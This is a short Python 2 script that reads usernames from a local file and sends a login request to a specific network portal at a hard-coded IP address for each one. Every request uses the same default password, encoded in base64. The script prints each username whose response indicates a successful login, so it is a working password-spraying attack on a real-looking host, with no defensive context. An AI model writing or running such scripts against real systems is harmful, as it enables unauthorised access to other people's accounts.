import urllib2
import requests

url = 'http://222.24.19.190:8080/portal/pws?t=li'
r = open('C:\Users\Administrator\Desktop\list.txt', 'r')
while (r.readline()):
	
	username = r.readline()[:-1]
	headers = {
	'Host': '222.24.19.190:8080',
	'Proxy-Connection': 'keep-alive',
	'Content-Length': '291',
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'Origin': 'http://222.24.19.190:8080',
	'X-Requested-With': 'XMLHttpRequest',
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Referer': 'http://222.24.19.190:8080/portal/index_default.jsp',
	'Accept-Encoding': 'gzip,deflate,sdch',
	'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',
	'Cookie': 'hello1='+username+'; hello2=false; hello3=; hello4=; i_p_pl=%7B%22errorNumber%22%3A1%2C%22nextUrl%22%3A%22HTTP%3A%2F%2F222.24.19.190%3A8080%2Fportal%2Findex_default.jsp%22%2C%22quickAuth%22%3Afalse%2C%22clientLanguage%22%3A%22Chinese%22%2C%22defaultServiceType%22%3A%22%22%2C%22assignIpType%22%3A0%2C%22iNodePwdNeedEncrypt%22%3A1%2C%22findPwdUrl%22%3A%22http%3A%2F%2F222.24.19.190%3A8080%2Fselfservice%2Fmail%2FforgetPassword.jsf%3Finit%3Dtrue%26url%3DaHR0cDovLzIyMi4yNC4xOS4xOTA6ODA4MC9wb3J0YWwvaW5kZXhfZGVmYXVsdC5qc3A%3D%22%2C%22nasIp%22%3A%22%22%2C%22ifTryUsePopupWindow%22%3Atrue%7D'
	}

	data = 'userName='+username+'&userPwd=MTExMTEx&serviceType=&userurl=&userip=&basip=&language=Chinese&portalProxyIP=222.24.19.190&portalProxyPort=50200&dcPwdNeedEncrypt=1&assignIpType=0&appRootUrl=http%3A%2F%2F222.24.19.190%3A8080%2Fportal%2F&manualUrl=&manualUrlEncryptKey=rTCZGLy2wJkfobFEj0JF8A%3D%3D'

	res = requests.post(url, data, headers=headers)
	if (len(res.content) > 399):
		print username+'\n'
r.close()
